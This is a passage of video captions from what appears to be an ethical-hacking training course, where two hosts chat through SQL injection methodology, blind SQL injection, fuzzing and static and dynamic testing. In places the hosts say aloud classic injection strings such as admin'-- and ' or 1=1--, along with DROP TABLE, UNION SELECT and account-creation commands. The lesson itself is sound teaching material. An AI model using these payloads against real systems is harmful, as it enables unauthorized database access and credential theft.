commands,\n\n789\n00:37:57.910 --> 00:38:02.230\nto drill through, look at\nthe databases inside of that system.\n\n790\n00:38:02.230 --> 00:38:06.460\nThen drill through the databases looking\nfor tables that may be of interest and\n\n791\n00:38:06.460 --> 00:38:08.900\nthen drill down to look at\ncolumns that are of interest and\n\n792\n00:38:08.900 --> 00:38:10.871\nthen pull that information and dump it.\n\n793\n00:38:10.871 --> 00:38:12.740\nYou know, step by step, stage by stage,\n\n794\n00:38:12.740 --> 00:38:15.645\nthis is essentially a full\nblown SQL injection attack.\n\n795\n00:38:15.645 --> 00:38:16.560\n&gt;&gt; Uh-huh.\n&gt;&gt; Kinda start to finish.\n\n796\n00:38:16.560 --> 00:38:19.180\nThis is what maybe over a cup\nof coffee in the morning,\n\n797\n00:38:19.180 --> 00:38:22.340\nyou would do if you were a hacker,\nlooking for information.\n\n798\n00:38:22.340 --> 00:38:25.670\nYou would then go out, have a nice\ndinner or nice breakfast or nice lunch,\n\n799\n00:38:25.670 --> 00:38:26.746\nwhatever you were doing.\n\n800\n00:38:26.746 --> 00:38:30.220\nAnd you would come back and then you would\ntake that information we just generated,\n\n801\n00:38:30.220 --> 00:38:34.380\nusernames and passwords aAnd you would go\nin and actually attack that system and\n\n802\n00:38:34.380 --> 00:38:35.230\ntake over.\n\n803\n00:38:35.230 --> 00:38:38.000\nAnd you know, in that point you can\ndo just about anything in theory.\n\n804\n00:38:38.000 --> 00:38:40.130\nWouldn't really matter but\nyou would then be able to go in and\n\n805\n00:38:40.130 --> 00:38:42.730\nyou would be able to exploit\nall the data found there.\n\n806\n00:38:42.730 --> 00:38:45.890\nThis is essentially the SQL\ninjection methodology, right?\n\n807\n00:38:45.890 --> 00:38:49.890\nInformation gathering and SQL injection\nvulnerability detection, step one.\n\n808\n00:38:49.890 --> 00:38:52.260\nLaunch SQL injection attacks, step two.\n\n809\n00:38:52.260 --> 00:38:53.190\nWe showed you this.\n\n810\n00:38:53.190 --> 00:38:56.360\nAdvanced SQL injection, in some cases\ndepending on the tool you're using,\n\n811\n00:38:56.360 --> 00:38:58.410\nto be able to gather information and\nexploit.\n\n812\n00:38:58.410 --> 00:39:00.560\nI mean this is essentially what we do,\nright?\n\n813\n00:39:00.560 --> 00:39:01.990\n&gt;&gt; Yeah.\n&gt;&gt; And so this is the whole thing in\n\n814\n00:39:01.990 --> 00:39:04.335\na nutshell or\nthe whole enchilada as they say.\n\n815\n00:39:04.335 --> 00:39:06.900\n&gt;&gt; [LAUGH]\n&gt;&gt; In certain parts of the world.\n\n816\n00:39:06.900 --> 00:39:10.080\nOr bean burrito if you\nare a vegetarian I suppose, right?\n\n817\n00:39:10.080 --> 00:39:10.932\nWhat ever you would like.\n\n818\n00:39:10.932 --> 00:39:14.540\nAll right, so when we think about this and\nwe actually just went through it and\n\n819\n00:39:14.540 --> 00:39:17.100\nhit all these highlights, but\nlet's delve down a little bit more.\n\n820\n00:39:17.100 --> 00:39:19.745\nI know we do have some additional\ninformation we want to get through in\n\n821\n00:39:19.745 --> 00:39:23.590\nthere quickly to kind of wrap this up,\nmake this all copacetic, right, and\n\n822\n00:39:23.590 --> 00:39:24.560\nput it all together.\n\n823\n00:39:24.560 --> 00:39:27.340\nSo we know information gathering,\nwe've taken a look at that and\n\n824\n00:39:27.340 --> 00:39:28.880\nseen how that's gonna happen.\n\n825\n00:39:28.880 --> 00:39:31.970\nYou're gonna wanna think about\nidentifying data entry pass.\n\n826\n00:39:31.970 --> 00:39:33.630\nWe're gonna,\nwe can stick on that for a second.\n\n827\n00:39:33.630 --> 00:39:35.360\nWe're gonna come back to\nthat in just a minute.\n\n828\n00:39:35.360 --> 00:39:36.440\nNo big deal, that's fine.\n\n829\n00:39:36.440 --> 00:39:39.134\nOr you could listen to me talk and\nwatch me at the same time, cuz either way.\n\n830\n00:39:39.134 --> 00:39:40.370\n&gt;&gt; [LAUGH]\n&gt;&gt; I was just gonna sit and\n\n831\n00:39:40.370 --> 00:39:43.040\ndo one of these while I was talking but\nthat's not a big deal.\n\n832\n00:39:43.040 --> 00:39:45.502\nIf you want to watch me, could I do this?\n\n833\n00:39:45.502 --> 00:39:47.836\n[LAUGH] Can I talk from down here?\n\n834\n00:39:47.836 --> 00:39:49.209\nCan you see me?\n\n835\n00:39:49.209 --> 00:39:50.600\nCan I do this?\n\n836\n00:39:50.600 --> 00:39:52.020\n&gt;&gt; Finger dancing, there we go.\n\n837\n00:39:52.020 --> 00:39:53.178\n&gt;&gt; And look, I'm back.\n\n838\n00:39:53.178 --> 00:39:56.633\n[LAUGH] All right, it would be great if\nyou had a raised platform that would come\n\n839\n00:39:56.633 --> 00:40:00.062\nup and give me another two inches so\nI would actually top out at the top there.\n\n840\n00:40:00.062 --> 00:40:03.110\nAll right, so we can obviously\nextract all this kind of data, right?\n\n841\n00:40:03.110 --> 00:40:06.733\nWe can look for Error messages that talk\nabout the fact that we could do probing,\n\n842\n00:40:06.733 --> 00:40:08.683\nspecifically to check different errors,\n\n843\n00:40:08.683 --> 00:40:11.460\nto understand what kind of\ndatabase we may be looking at.\n\n844\n00:40:11.460 --> 00:40:13.760\nWe didn't actually demo that per say, but\n\n845\n00:40:13.760 --> 00:40:17.140\nyou can easily figure out that we\ncan go in and do that as well.\n\n846\n00:40:17.140 --> 00:40:21.450\nSo, you're thinking about injecting errors\nand then extracting information that tells\n\n847\n00:40:21.450 --> 00:40:24.669\nus what kind of database it is from\nthe errors, would not be unrealistic.\n\n848\n00:40:24.669 --> 00:40:26.720\nWe had the benefit of\nusing the SQL map tool,\n\n849\n00:40:26.720 --> 00:40:29.470\nthat would clearly identify\nthe SQL database on the backend.\n\n850\n00:40:29.470 --> 00:40:32.840\nBut if we had to do that, it would not\nbe hard to do, let's put it that way.\n\n851\n00:40:32.840 --> 00:40:35.030\nSo, this is all part of error gathering.\n\n852\n00:40:35.030 --> 00:40:39.640\nI know that we have actually,\nsome various testing strings, right,\n\n853\n00:40:39.640 --> 00:40:41.930\nthat's actually what I wanted to show\nfirst before we do the testing one.\n\n854\n00:40:41.930 --> 00:40:45.960\nYeah, it's a little table there you\nmight put together, just to sample,\n\n855\n00:40:45.960 --> 00:40:48.120\nagain, not definitive by any means.\n\n856\n00:40:48.120 --> 00:40:50.850\nThere are hundreds that\nwould go on beyond this.\n\n857\n00:40:50.850 --> 00:40:54.500\nBut these are just some examples\nof testing strings that we can use\n\n858\n00:40:54.500 --> 00:40:57.580\nalong with the code we showed earlier, in\nthe other table, where we could probe for\n\n859\n00:40:57.580 --> 00:40:59.480\nvulnerabilities and\nweaknesses on websites,\n\n860\n00:40:59.480 --> 00:41:03.180\nthat would allow us to see whether or not\nwe may be able to execute a SQL injection.\n\n861\n00:41:03.180 --> 00:41:07.890\nSo these are all strings that could be\nused against a targeted application or\n\n862\n00:41:07.890 --> 00:41:09.650\ndatabase, to see if if\nwould be vulnerable.\n\n863\n00:41:09.650 --> 00:41:13.850\nThings like drop table, would allow us\nto drop a table, deleting the data.\n\n864\n00:41:13.850 --> 00:41:17.949\nLook at the difference there with\nunion all select or look at version.\n\n865\n00:41:17.949 --> 00:41:20.390\nOr group by user id, various things.\n\n866\n00:41:20.390 --> 00:41:22.128\nSo we could go and\nthere's a whole bunch of these.\n\n867\n00:41:22.128 --> 00:41:25.749\nWe could do a create username, identified\nby some sort of password string, and\n\n868\n00:41:25.749 --> 00:41:28.829\ntry to create a user based on the fact\nthere's a password there, and\n\n869\n00:41:28.829 --> 00:41:30.955\nthen be able to do that,\nor that there's not.\n\n870\n00:41:30.955 --> 00:41:33.565\nWe could do all sorts of different stuff.\n\n871\n00:41:33.565 --> 00:41:38.212\nYou could go in and do a,\nI'm just thinking about or username,\n\n872\n00:41:38.212 --> 00:41:40.680\ndo you have or username up there?\n\n873\n00:41:40.680 --> 00:41:42.890\nYou don't have one, [CROSSTALK] You do,\nlike character 37, right.\n\n874\n00:41:42.890 --> 00:41:44.476\nSo you could do that and say yeah,\n\n875\n00:41:44.476 --> 00:41:47.490\nwe wanna be able to find usernames\nof a certain length, right?\n\n876\n00:41:47.490 --> 00:41:48.190\nStuff like that.\n\n877\n00:41:48.190 --> 00:41:52.880\nSo, there's lots of ways to do information\nprobing, information gathering, here.\n\n878\n00:41:52.880 --> 00:41:55.910\nWe may go in,\nlet's put up the test types now.\n\n879\n00:41:55.910 --> 00:41:58.326\nNow we want to talk about\ndifferent testing types.\n\n880\n00:41:58.326 --> 00:42:03.320\nSo we wanna be able to also probe here and\nsee ways in which we can tell\n\n881\n00:42:03.320 --> 00:42:06.510\nwhat's going on in the backend and\nagain, if we are vulnerable.\n\n882\n00:42:06.510 --> 00:42:10.430\nWe may be able to do function testing,\nmay be able to do fuzzing or fuzz testing,\n\n883\n00:42:10.430 --> 00:42:13.210\nIt's referred to differently,\nstatic indoor dynamic testing.\n\n884\n00:42:13.210 --> 00:42:15.460\nLet's start at the top there\nwith function testing.\n\n885\n00:42:15.460 --> 00:42:17.300\nYeah, you can see that with me there,\nno problem.\n\n886\n00:42:17.300 --> 00:42:18.871\nSo, I always get it wrong.\n\n887\n00:42:18.871 --> 00:42:21.297\nSo if I, no, no.\n\n888\n00:42:21.297 --> 00:42:22.361\n&gt;&gt; [LAUGH] What the hell?\n\n889\n00:42:22.361 --> 00:42:25.553\n&gt;&gt; Everything, [CROSSTALK]\n&gt;&gt; That's why.\n\n890\n00:42:25.553 --> 00:42:27.577\n&gt;&gt; Got to point to me.\n\n891\n00:42:27.577 --> 00:42:30.001\n&gt;&gt; Yeah, well thank you very much,\nthat would have been helpful before.\n\n892\n00:42:30.001 --> 00:42:31.927\n&gt;&gt; [LAUGH]\n&gt;&gt; So, I wanna go up there,\n\n893\n00:42:31.927 --> 00:42:34.625\nis where I want, can I go up,\n&gt;&gt; Wait, wait, wait, I can go up.\n\n894\n00:42:34.625 --> 00:42:35.217\nCan I move it?\n\n895\n00:42:35.217 --> 00:42:37.529\n[SOUND] Okay, wait, wait,\nlet's do that again.\n\n896\n00:42:37.529 --> 00:42:39.289\n[SOUND] Okay, there we go,\nlet's push it up.\n\n897\n00:42:39.289 --> 00:42:40.919\n&gt;&gt; Okay, ready?\n\n898\n00:42:40.919 --> 00:42:42.156\n&gt;&gt; Wait, wait, wait, okay.\n[SOUND] Okay, right there, yep.\n\n899\n00:42:42.156 --> 00:42:43.620\nWell, wait, wait, just a, perfect.\n\n900\n00:42:43.620 --> 00:42:47.145\nRight, okay, so we've actually got\na set of levers up above here.\n\n901\n00:42:47.145 --> 00:42:48.100\n&gt;&gt; [LAUGH]\n&gt;&gt; Right,\n\n902\n00:42:48.100 --> 00:42:49.830\nthat I can use to pull that stuff down.\n\n903\n00:42:49.830 --> 00:42:51.840\nAll right, that was strenuous,\nI gotta sit down and take a break.\n\n904\n00:42:51.840 --> 00:42:52.357\n&gt;&gt; You need a break, yeah.\n[LAUGH]\n\n905\n00:42:52.357 --> 00:42:53.372\n&gt;&gt; Can we stop for like five minutes?\n\n906\n00:42:53.372 --> 00:42:54.623\n&gt;&gt; Water!\n&gt;&gt; We'll be back and\n\n907\n00:42:54.623 --> 00:42:57.082\nis there a water boy or\na water girl can I get some water?\n\n908\n00:42:57.082 --> 00:42:58.420\n&gt;&gt; [LAUGH]\n&gt;&gt; Just come out and\n\n909\n00:42:58.420 --> 00:43:00.290\nthrow water on me that was a hard workout,\n\n910\n00:43:00.290 --> 00:43:02.280\nit's the hardest I've\nhad to work all week.\n\n911\n00:43:02.280 --> 00:43:04.480\nAll right, so function testing,\nlet's talk about this.\n\n912\n00:43:04.480 --> 00:43:08.675\nSo the idea here is that, if we're\ngonna go in, we're gonna want to probe.\n\n913\n00:43:08.675 --> 00:43:12.085\nAgain the idea is here, how are we probing\nto see if we are gonna be susceptible.\n\n914\n00:43:12.085 --> 00:43:14.095\nWhat can we do, how do we do that?\n\n915\n00:43:14.095 --> 00:43:17.205\nFunction testing falls within\nthe scope of black box testing,\n\n916\n00:43:17.205 --> 00:43:20.245\nso yeah, we've talked about different\ntesting types in other episodes.\n\n917\n00:43:20.245 --> 00:43:24.408\nWe often talk about white box, gray box,\nblack box, white hat, gray hat, black hat.\n\n918\n00:43:24.408 --> 00:43:29.115\nSo a black box test is a test that's\ndone with really no knowledge, right?\n\n919\n00:43:29.115 --> 00:43:30.635\n&gt;&gt; Right.\n&gt;&gt; We sometimes talk about blind,\n\n920\n00:43:30.635 --> 00:43:33.100\ndouble blind testing as well,\n\n921\n00:43:33.100 --> 00:43:36.360\nthis could be an external to\nthe security perimeter test.\n\n922\n00:43:36.360 --> 00:43:38.920\nWe don't know anything about\nthe system other than what we can glean\n\n923\n00:43:38.920 --> 00:43:41.940\nthrough social engineering or\nthrough essential reconing.\n\n924\n00:43:41.940 --> 00:43:44.200\nSo we're on the outside,\nreally know knowledge, right?\n\n925\n00:43:44.200 --> 00:43:45.000\nI would wanna go in, and\n\n926\n00:43:45.000 --> 00:43:47.690\nin this case, we don't know anything\nabout the data base or the app.\n\n927\n00:43:47.690 --> 00:43:51.050\nWe may be inside the network, but we don't\nknow anything about the structure when we\n\n928\n00:43:51.050 --> 00:43:54.720\ntalk about black box,\nwe're essentially saying it's a mystery,\n\n929\n00:43:54.720 --> 00:43:56.900\nwe just don't really know\nwhat we're getting into.\n\n930\n00:43:56.900 --> 00:43:59.620\nAnd so, as such right,\nwe're gonna have to have inner working and\n\n931\n00:43:59.620 --> 00:44:02.980\nknowledge of what's going on in there,\nto be able to really understand.\n\n932\n00:44:02.980 --> 00:44:06.865\nThe sense of function testing\nwould try to drill down, and\n\n933\n00:44:06.865 --> 00:44:11.445\nby adding in parameters and probing and\ntesting, using different scripts,\n\n934\n00:44:11.445 --> 00:44:15.325\ndifferent derivatives of scripts,\nsome of the sample snipets we showed you,\n\n935\n00:44:15.325 --> 00:44:17.450\nwe'll be able to start\nmapping out the function.\n\n936\n00:44:17.450 --> 00:44:20.620\nHey, how does it work, if we do this\nwhat happens, so we get this error.\n\n937\n00:44:20.620 --> 00:44:24.370\nIf I create a user with this command,\ndoes it go into this the sef,\n\n938\n00:44:24.370 --> 00:44:26.990\ndoes it just kind of the database,\nif not maybe something else.\n\n939\n00:44:26.990 --> 00:44:32.240\nSo we're probing, by using commands that\nhave accepted and understood parameters,\n\n940\n00:44:32.240 --> 00:44:34.730\nto understand the outcomes and we're\nlooking to see what the functions are.\n\n941\n00:44:34.730 --> 00:44:35.990\nIt's like when you go to the doctor.\n\n942\n00:44:35.990 --> 00:44:37.779\nRemember years you go to the doctor,\n\n943\n00:44:37.779 --> 00:44:39.923\npediatrician that puts\nyou up on the table.\n\n944\n00:44:39.923 --> 00:44:42.060\nAnd they have a little\nstupid rubber mallet, right.\n\n945\n00:44:42.060 --> 00:44:44.660\nAnd they would hit your, they still do it\nas if you're an adult, depending on what\n\n946\n00:44:44.660 --> 00:44:47.340\nyou're doing, but they would hit your\nleg looking for your reflex, right.\n\n947\n00:44:47.340 --> 00:44:50.798\nIf you leg shot out, you know,\nthe involuntary reflex, you knew or\n\n948\n00:44:50.798 --> 00:44:53.542\nthey knew that you were good and\neverything was okay.\n\n949\n00:44:53.542 --> 00:44:58.268\nAnd so, with something like that,\nbecause the expected response is,\n\n950\n00:44:58.268 --> 00:45:00.964\nstrike knee cap and then leg shoots out.\n\n951\n00:45:00.964 --> 00:45:04.591\nOr if they do the thing on the bottom of\nthe foot, where they do this to check if\n\n952\n00:45:04.591 --> 00:45:08.124\nyou twitch or curl your toes to see\nif you detect what's going on, right?\n\n953\n00:45:08.124 --> 00:45:11.390\nSo those kind of things when we\nknow we get a certain response.\n\n954\n00:45:11.390 --> 00:45:13.820\nFunction testing is\nprobing the parameters,\n\n955\n00:45:13.820 --> 00:45:16.270\nto try to figure out which one\nis fallen into place there.\n\n956\n00:45:16.270 --> 00:45:18.620\nSo, we can also do fuzzing or\nfuzz testing.\n\n957\n00:45:18.620 --> 00:45:19.710\nSo, let's go up.\n\n958\n00:45:19.710 --> 00:45:21.504\nYeah, I'm not reaching up again,\nit's way too stressful.\n\n959\n00:45:21.504 --> 00:45:23.370\n&gt;&gt; [LAUGH]\n&gt;&gt; Nah, I'm done.\n\n960\n00:45:23.370 --> 00:45:26.923\nI work way too hard as it is, so\nI'm not gonna do and extend myself,\n\n961\n00:45:26.923 --> 00:45:27.881\nif not required.\n\n962\n00:45:27.881 --> 00:45:30.370\nBut you know what I could do,\nthis could be kinda close.\n\n963\n00:45:30.370 --> 00:45:33.593\nI go over here, maybe like right\nover here, and if I go this way.\n\n964\n00:45:33.593 --> 00:45:37.395\nSo let me see, so if I go here, I can do\nlike the Olympic header thing, so wait,\n\n965\n00:45:37.395 --> 00:45:38.410\npull it down.\n\n966\n00:45:38.410 --> 00:45:41.446\nOkay, now if I jump up,\n[SOUND], I can be like-\n\n967\n00:45:41.446 --> 00:45:42.721\n&gt;&gt; Awesome.\n\n968\n00:45:42.721 --> 00:45:45.150\n&gt;&gt; It was like a head\nshot right near the goal.\n\n969\n00:45:45.150 --> 00:45:46.032\n&gt;&gt; That was perfect.\n&gt;&gt; Gooooaaaaaallllllll.\n\n970\n00:45:46.032 --> 00:45:47.438\n&gt;&gt; You gotta laugh once and\nawhile Megan, its funny.\n\n971\n00:45:47.438 --> 00:45:49.300\n&gt;&gt; [LAUGH]\n&gt;&gt; Don't just sit there and\n\n972\n00:45:49.300 --> 00:45:50.148\nbe stone faced.\n\n973\n00:45:50.148 --> 00:45:51.712\n&gt;&gt; [LAUGH]\n&gt;&gt; Actually laugh.\n\n974\n00:45:51.712 --> 00:45:57.350\nAll right so, when we do fuzzing or fuzz\ntesting, what we're thinking about here is\n\n975\n00:45:57.350 --> 00:45:59.500\nwe're going and we're trying to\nfigure out coding errors, right?\n\n976\n00:45:59.500 --> 00:46:03.360\nSo, we're gonna push a bunch of stuff in,\nagain, trying to input\n\n977\n00:46:03.360 --> 00:46:07.640\nmassive amounts of data, seeing if we're\nhandling errors and over flow's correctly.\n\n978\n00:46:07.640 --> 00:46:08.820\nSo fuzzing is kind of cool,\n\n979\n00:46:08.820 --> 00:46:12.150\nbecause we actually use this when\nwe did the other demo right?\n\n980\n00:46:12.150 --> 00:46:14.820\nWe're doing the hacking web\napp web server discussion and\n\n981\n00:46:14.820 --> 00:46:16.510\nwe did those episodes\nthan we did the demo.\n\n982\n00:46:16.510 --> 00:46:18.760\nAnd the first thing we did was\ngo out to the URL Fuzzer site.\n\n983\n00:46:18.760 --> 00:46:20.090\n&gt;&gt; Right.\n&gt;&gt; Remember how we went in and\n\n984\n00:46:20.090 --> 00:46:23.345\nI entered the URL, and then we went and\nthen we saw that there were hidden\n\n985\n00:46:23.345 --> 00:46:26.485\ndirectory so we could pull them up,\nthat's a form of fuzzing.\n\n986\n00:46:26.485 --> 00:46:30.555\nBut this particular approach is\ndumping massive amounts of data\n\n987\n00:46:30.555 --> 00:46:34.535\nin random sets to see what\nhappens on the other side.\n\n988\n00:46:34.535 --> 00:46:37.985\nAnd if we get to a point where we get\nerrors, or we get a change of behavior,\n\n989\n00:46:37.985 --> 00:46:40.665\nwe know that there are certain\nparameters set in a certain way and\n\n990\n00:46:40.665 --> 00:46:43.235\nagain we can tell based on\nwhat's happening there,\n\n991\n00:46:43.235 --> 00:46:45.775\nhow this is the expected outcome\nof what we're looking for.\n\n992\n00:46:45.775 --> 00:46:50.023\nIt's a very common accepted way of doing\ntesting, we do it with malware, as well.\n\n993\n00:46:50.023 --> 00:46:52.110\nThere's a lot of different\nthings we use this for.\n\n994\n00:46:52.110 --> 00:46:55.560\nStatic and or dynamic testing,\nwe analyze the application source code.\n\n995\n00:46:55.560 --> 00:46:57.920\nBut here's the interesting thing,\nthis is done differently.\n\n996\n00:46:57.920 --> 00:47:01.320\nWe grouped them together just to say\nit's a testing type, a category.\n\n997\n00:47:01.320 --> 00:47:03.660\nBut it's actually two\ndistinctly different tests.\n\n998\n00:47:03.660 --> 00:47:07.448\nStatic testing, we don't actually run the\ncode, we simply analyze the code offline.\n\n999\n00:47:07.448 --> 00:47:11.770\nWe'll de-compile it,\nwe'll take a look in the case of web code.\n\n1000\n00:47:11.770 --> 00:47:14.690\nWe don't have to de-compile it typically,\nwe just have to look at the code, but\n\n1001\n00:47:14.690 --> 00:47:17.260\nif it was an application,\nwe may have to break it open and\n\n1002\n00:47:17.260 --> 00:47:19.280\nactually de-compile it and look at code.\n\n1003\n00:47:19.280 --> 00:47:22.410\nDynamic testing we actually run it to so\nwhat it does.\n\n1004\n00:47:22.410 --> 00:47:26.200\nSo, we wanna probably process isolate it,\nput it in a sandbox somewhere, and\n\n1005\n00:47:26.200 --> 00:47:27.790\nrun it to see what will happen.\n\n1006\n00:47:27.790 --> 00:47:31.400\nBut we're gonna statically and\ndynamically probe and examine to see,\n\n1007\n00:47:31.400 --> 00:47:33.290\nagain, what the outcome may be,\n\n1008\n00:47:33.290 --> 00:47:37.500\nthere may be different kinds of things\nthat we're looking for, maybe tell-tale\n\n1009\n00:47:37.500 --> 00:47:41.020\nsigns in the code that may help us\nto understand their vulnerabilities.\n\n1010\n00:47:41.020 --> 00:47:43.230\nAnd this is what we're\nactually looking to do and\n\n1011\n00:47:43.230 --> 00:47:46.030\npotentially trying to figure out how\nto gain an advantage on, all right.\n\n1012\n00:47:46.030 --> 00:47:49.340\nSo, I've shown you how to actually\nlaunch sequel injection attacks.\n\n1013\n00:47:49.340 --> 00:47:50.880\nSo went through and did this demo.\n\n1014\n00:47:50.880 --> 00:47:52.093\nAs Mike said, it was a brilliant demo.\n\n1015\n00:47:52.093 --> 00:47:53.380\nAlthough, I am putting words in his mouth.\n\n1016\n00:47:53.380 --> 00:47:54.066\nHe didn't say it was brilliant but\nI think it was brilliant.\n\n1017\n00:47:54.066 --> 00:47:57.070\n&gt;&gt; [LAUGH]\n&gt;&gt; So we went through, we did this demo\n\n1018\n00:47:57.070 --> 00:48:00.400\nfor you so You're in stage two,\nwe're actually launching the attack.\n\n1019\n00:48:00.400 --> 00:48:01.220\nWe've actually walked through that.\n\n1020\n00:48:01.220 --> 00:48:02.136\nYou've seen that live.\n\n1021\n00:48:02.136 --> 00:48:03.790\nWe've actually done that for you, right.\n\n1022\n00:48:03.790 --> 00:48:06.570\nAnd we've shown you what the union\nselect course are like and\n\n1023\n00:48:06.570 --> 00:48:10.150\nthe error selects were and all that stuff\ncuz the SQL math will does all those and\n\n1024\n00:48:10.150 --> 00:48:13.580\nreport them up several times as we run\nthrough for you to be able to see.\n\n1025\n00:48:13.580 --> 00:48:16.850\nWe talked about store procedures and\nhow we may be able to use those.\n\n1026\n00:48:16.850 --> 00:48:19.073\nYou're trying different logon scripts or\n\n1027\n00:48:19.073 --> 00:48:23.400\nelements of logon script snippets to be\nable to figure out what users are there.\n\n1028\n00:48:23.400 --> 00:48:27.076\nYou showed some of those\nin your little table.\n\n1029\n00:48:27.076 --> 00:48:34.180\nYou'll admin'--, admin'#,\nadmin'/*, or, single quote or\n\n1030\n00:48:34.180 --> 00:48:37.765\none equals one dash dash, all these\nlittle snippet strings you put in there.\n\n1031\n00:48:37.765 --> 00:48:41.910\nLogon as different users, right, and\ntry to bypass and see what happens.\n\n1032\n00:48:41.910 --> 00:48:43.310\nYeah, we've done some of these things,\n\n1033\n00:48:43.310 --> 00:48:46.030\nand we talked about different\nexploits that may occur.\n\n1034\n00:48:46.030 --> 00:48:49.390\nWe can go in and check for\nusername length.\n\n1035\n00:48:49.390 --> 00:48:51.550\nWe could check to see if users, usernames,\n\n1036\n00:48:51.550 --> 00:48:55.280\ncontain certain characters by walking\nthrough with different scripts you showed\n\n1037\n00:48:55.280 --> 00:48:58.940\nthat where we have the username\nequals character 37 or whatever.\n\n1038\n00:48:58.940 --> 00:49:02.040\nAnd we could go through and\nwe can obviously see what that maybe.\n\n1039\n00:49:02.040 --> 00:49:06.110\nSo there's lots of different ways for\nus to be able to get all this information.\n\n1040\n00:49:06.110 --> 00:49:07.610\nWe can extract column names and\n\n1041\n00:49:07.610 --> 00:49:11.270\ndatabase names and I showed you how to\ndo all that with blind SQL attacks.\n\n1042\n00:49:11.270 --> 00:49:15.360\nCuz that's essentially what I was doing,\nI was blind, I wasn't in the database,\n\n1043\n00:49:15.360 --> 00:49:16.350\nI didn't know what was there.\n\n1044\n00:49:16.350 --> 00:49:17.410\nWell, little secret.\n\n1045\n00:49:17.410 --> 00:49:19.215\nI did cuz I built it but\nthat's not the point.\n\n1046\n00:49:19.215 --> 00:49:20.459\n&gt;&gt; [LAUGH]\n&gt;&gt; The point is, right?\n\n1047\n00:49:20.459 --> 00:49:23.264\nWe know but the real world\nwouldn't know what was there or\n\n1048\n00:49:23.264 --> 00:49:26.660\nshowing all the magic and\nexposing all our secrets here, right?\n\n1049\n00:49:26.660 --> 00:49:29.970\nBut you know clearly, we're gaining\nthe system here in terms of setting it up\n\n1050\n00:49:29.970 --> 00:49:33.180\nan knowing that that's gonna work but\nin the real world, these,\n\n1051\n00:49:33.180 --> 00:49:37.110\nwhat I just walked through in the demo,\nwould be a classic example of a blind\n\n1052\n00:49:37.110 --> 00:49:39.820\nSQL attack that we we're talking\nabout because we're on the outside.\n\n1053\n00:49:39.820 --> 00:49:41.750\nWe don't know it's a black box attack.\n\n1054\n00:49:41.750 --> 00:49:43.070\nWe're not sure what's gonna happen.\n\n1055\n00:49:43.070 --> 00:49:46.460\nWe're just going in and extracting\nthe database and then the tables and\n\n1056\n00:49:46.460 --> 00:49:48.090\nthen the columns and the rows.\n\n1057\n00:49:48.090 --> 00:49:49.860\nYou'll ultimately getting\nthe value in there.\n\n1058\n00:49:49.860 --> 00:49:53.010\nWe walk through that whole thought process\ntrying to figure out what would or\n\n1059\n00:49:53.010 --> 00:49:54.260\nwould not occur.\n\n1060\n00:49:54.260 --> 00:49:55.830\nSo we do wanna think about that, right.\n\n1061\n00:49:55.830 --> 00:49:58.880\nAnd obviously understand that there\nis a lot of value in that and\n\n1062\n00:49:58.880 --> 00:50:00.960\nthen we may use advanced techniques right.\n\n1063\n00:50:00.960 --> 00:50:04.720\nWe may go in and, as we said,\nenumerate database's tables columns.\n\n1064\n00:50:04.720 --> 00:50:08.390\nBut, we may try to identify user-level\nprivileges associated with that.\n\n1065\n00:50:08.390 --> 00:50:10.510\nWe just pull the usernames and\nthe passwords,\n\n1066\n00:50:10.510 --> 00:50:13.060\nbut we may wanna go after\nthe DB admin account, right?\n\n1067\n00:50:13.060 --> 00:50:16.010\nAnd go in and try to find out the DBO,\nthe database owner.\n\n1068\n00:50:16.010 --> 00:50:18.100\nWe may try to discover\nthe database structure,\n\n1069\n00:50:18.100 --> 00:50:21.140\nand obviously the database\nstructure if it's enumerated,\n\n1070\n00:50:21.140 --> 00:50:24.230\ncan help us to understand what\nversion of database maybe running.\n\n1071\n00:50:24.230 --> 00:50:28.950\nI showed you some different commands to\nenumerate users on a different versions of\n\n1072\n00:50:28.950 --> 00:50:32.840\ndatabases, when I just did the quick demo\nbefore we did the long walkthrough and\n\n1073\n00:50:32.840 --> 00:50:33.820\nyou're depending on version.\n\n1074\n00:50:34.820 --> 00:50:39.730\nAnd a SQL, MySQL, Oracle, DB2, PostgreSQL.\n\n1075\n00:50:39.730 --> 00:50:43.660\nThere's different code that would be\nused to center to get to the same place.\n\n1076\n00:50:43.660 --> 00:50:46.360\nColumn enumeration is done\nin every one of these, but\n\n1077\n00:50:46.360 --> 00:50:49.560\nit's done a little bit differently,\njust depending on what we're looking at.\n\n1078\n00:50:49.560 --> 00:50:51.370\nSo, yeah we do wanna understand that.\n\n1079\n00:50:51.370 --> 00:50:52.860\nWe do wanna be aware of that.\n\n1080\n00:50:52.860 --> 00:50:56.650\nThere are a lot of similarities but\nthere are differences, right.\n\n1081\n00:50:56.650 --> 00:51:01.440\nSo, for instance, if we want to do\nstring concantenation in Oracle and\n\n1082\n00:51:01.440 --> 00:51:05.900\nstring concantenation in PostgreSQL,\nit is almost identical.\n\n1083\n00:51:05.900 --> 00:51:09.618\nBut the interesting thing is Oracle does\ndouble quotes, two pipes and a single\n\n1084\n00:51:09.618 --> 00:51:13.972\nquotes, and Postgres does open double\nquotes, two pipes, closed double quotes.\n\n1085\n00:51:13.972 --> 00:51:18.650\nSo yeah, there's a small but slight\nvariation there and it varies again.\n\n1086\n00:51:18.650 --> 00:51:22.380\nSomething like MS SQL does open\nquotes plus sign close quotes, right?\n\n1087\n00:51:22.380 --> 00:51:24.350\nSo I mean, there's slight variation.\n\n1088\n00:51:24.350 --> 00:51:26.450\nAccess which I know is your favorite,\nright?\n\n1089\n00:51:26.450 --> 00:51:29.840\nA set of double quotes, space, another\nset of double quotes, and ampersand.\n\n1090\n00:51:29.840 --> 00:51:31.130\nAnd then close those, right.\n\n1091\n00:51:31.130 --> 00:51:33.000\nGoing there to do string a concatenation.\n\n1092\n00:51:33.000 --> 00:51:36.720\nThat's just one example, but there's all\nthese subtle variations that we could look\n\n1093\n00:51:36.720 --> 00:51:38.300\nat, it would really just depend.\n\n1094\n00:51:38.300 --> 00:51:40.100\nSo want to be thinking about that and\n\n1095\n00:51:40.100 --> 00:51:44.050\nobviously understand that creating\ndatabase accounts, password grabbing.\n\n1096\n00:51:44.050 --> 00:51:45.220\nI didn't show you how\nto create an account.\n\n1097\n00:51:45.220 --> 00:51:48.520\nI just showed you how to pull ones that\nare already there, but creating database\n\n1098\n00:51:48.520 --> 00:51:54.170\nusername accounts with a create user\nstring, which would be what we do Oracle.\n\n1099\n00:51:54.170 --> 00:51:57.100\nCreate user in Microsoft access\nwould kind of be the same.\n\n1100\n00:51:57.100 --> 00:52:00.491\nIn Microsoft SQL, you can execute\na stored procedure for that, right?\n\n1101\n00:52:00.491 --> 00:52:04.352\nExecute sp_addlogin, 